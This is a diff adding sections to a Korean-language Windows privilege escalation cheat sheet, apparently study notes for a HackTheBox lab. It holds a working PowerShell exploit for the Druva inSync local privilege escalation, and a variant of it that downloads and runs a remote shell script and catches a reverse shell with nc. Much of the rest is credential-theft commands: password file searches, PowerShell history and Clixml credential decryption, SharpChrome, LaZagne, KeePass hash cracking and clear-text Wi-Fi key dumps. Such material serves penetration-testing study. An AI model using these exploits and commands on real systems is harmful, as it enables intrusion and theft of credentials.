@@ -861,30 +861,251 @@ meterpreter > hashdump
 <br/><br/>
 # 취약한 서비스
 
+### 설치된 프로그램 열거
+```wmic product get name```<br/>
 
+- [Druva inSync Exploit](https://www.exploit-db.com/exploits/49211)
+- [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/)
 
+### 로컬 포트 ​​열거
+```netstat -ano | findstr 6064```
+
+### #### 프로세스 ID 열거
+```get-process -Id 3324```
+
+### 실행 중인 서비스 열거
+```get-service | ? {$_.DisplayName -like 'Druva*'}```
+
+## Druva inSync Windows 클라이언트 로컬 권한 상승 예제
+
+### Druva inSync PowerShell PoC
+```powershell
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+### PowerShell PoC 수정
+- [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+- 스크립트 맨 아래에 다음을 추가
+```Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443```<br/>
+- $cmd 변수 수정
+```$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"```
+
+### 파이썬 웹 서버 시작하기
+```python3 -m http.server 8080```
+
+### SYSTEM 셸 획득
+```nc -lvnp 9443```<br/>
+> 참고 : `Set-ExecutionPolicy Bypass -Scope Process`와 같은 명령으로 PowerShell 실행 정책 수정
 
 <br/><br/>
 # DLL Injection
 
+## LoadLibrary
+
+## Manual Mapping
+
+## Reflective DLL Injection
+- [참고 Github](https://github.com/stephenfewer/ReflectiveDLLInjection)
+
+## DLL 하이재킹
+
+### DLL Proxying
+
+### 잘못된 라이브러리
 
 <br/><br/>
 # Credential Hunting
 
+## 애플리케이션 구성 파일
 
+### 파일 검색
+```findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml```
 
+## Dictionary Files
 
+### Chrome Dictionary Files
+```gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password```
 
+## Unattended Installation Files
+- 자동 로그온 설정이나 설치의 일부로 생성될 추가 계정을 정의
+- `unattend.xml`의 비밀번호는 일반 텍스트 또는 base64로 인코딩되어 저장
 
+### Unattend.xml
+
+## PowerShell History File
+
+### 명령 기록 저장
+- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+### PowerShell History 저장 경로 확인
+```(Get-PSReadLineOption).HistorySavePath```
+
+### PowerShell History 파일 읽기
+```gc (Get-PSReadLineOption).HistorySavePath```<br/>
+```foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}```
+
+## PowerShell 자격 증명
+- vCenter 서버 관리용 `Connect-VC.ps1` 스크립트 예
+```powershell
+# Connect-VC.ps1
+# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
+$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
+$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
+Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
+```
+
+### Decrypting PowerShell Credentials
+```dir /s /b | find /i "pass.xml"```<br/>
+```$credential = Import-Clixml -Path 'C:\scripts\pass.xml'```<br/>
+```$credential.GetNetworkCredential().username```<br/>
+```$credential.GetNetworkCredential().password```
 
 <br/><br/>
 # 기타 파일
+- [Snaffler](https://github.com/SnaffCon/Snaffler)
 
+## 수동으로 파일 시스템 자격 증명 검색
+- [치트시트](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
 
+### 문자열에 대한 파일 내용 검색 - 예제 1
+```cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt```
 
+### 문자열에 대한 파일 내용 검색 - 예제 2
+```findstr /si password *.xml *.ini *.txt *.config```
+
+### 문자열에 대한 파일 내용 검색 - 예제 3
+```findstr /spin "password" *.*```
+
+### PowerShell을 사용하여 파일 내용 검색
+```select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password```
+
+### 파일 확장자 검색 - 예제 1
+```dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*```
+
+### 파일 확장자 검색 - 예제 2
+```where /R C:\ *.config```
+
+### PowerShell을 사용하여 파일 확장자 검색
+```Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore```
 
 <br/><br/>
-# Citrix Breakout
+## Sticky Notes Passwords
+
+### StickyNotes DB 파일 찾기
+```ls C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState```
+- 세 개의 `plum.sqlite*` 파일을 시스템에 복사
+- [DB Browser for SQLite](https://sqlitebrowser.org/dl/)
+````select Text from Note;````
+
+### Viewing Sticky Notes Data Using PowerShell
+- [PSSQLite 모듈](https://github.com/RamblingCookieMonster/PSSQLite)
+```
+Set-ExecutionPolicy Bypass -Scope Process
+cd .\PSSQLite\
+Import-Module .\PSSQLite.psd1
+$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
+```
+
+### Strings to View DB File Contents
+```strings plum.sqlite-wal```
+
+<br/><br/>
+## 관심 있는 다른 흥미로운 파일
+```shell-session
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+```
 
 <br/><br/>
 # 추가 자격 증명 도용
+
+## Cmdkey 저장된 자격 증명
+
+### 저장된 자격 증명 나열
+```cmdkey /list```
+
+### 다른 사용자로 명령 실행
+```runas /savecred /user:inlanefreight\bob "COMMAND HERE"```
+
+## 브라우저 자격 증명
+- [SharpChrome](https://github.com/GhostPack/SharpDPAPI)
+```.\SharpChrome.exe logins /unprotect```
+
+## 비밀번호 관리자
+- [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py)
+
+### KeePass 해시 추출
+```python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx```
+
+### 오프라인 해시 크래킹
+```hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt```
+
+## 이메일
+- [MailSniper](https://github.com/dafthack/MailSniper)
+
+## More Fun with Credentials
+
+### Running All LaZagne Modules
+- [LaZagne](https://github.com/AlessandroZ/LaZagne)
+```.\lazagne.exe all```
+
+## Even More Fun with Credentials
+
+### 현재 사용자로 SessionGopher 실행
+- [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
+```
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target WINLPE-SRV01
+```
+
+## 레지스트리의 일반 텍스트 암호 저장
+
+### reg.exe로 자동 로그온 열거
+```reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"```
+
+### Putty 세션 열거 및 자격 증명 찾기
+```reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions```
+
+## Wifi Passwords
+
+### 저장된 무선 네트워크 보기
+```netsh wlan show profile```
+
+### 저장된 무선 비밀번호 검색
+```netsh wlan show profile <profile 명> key=clear```
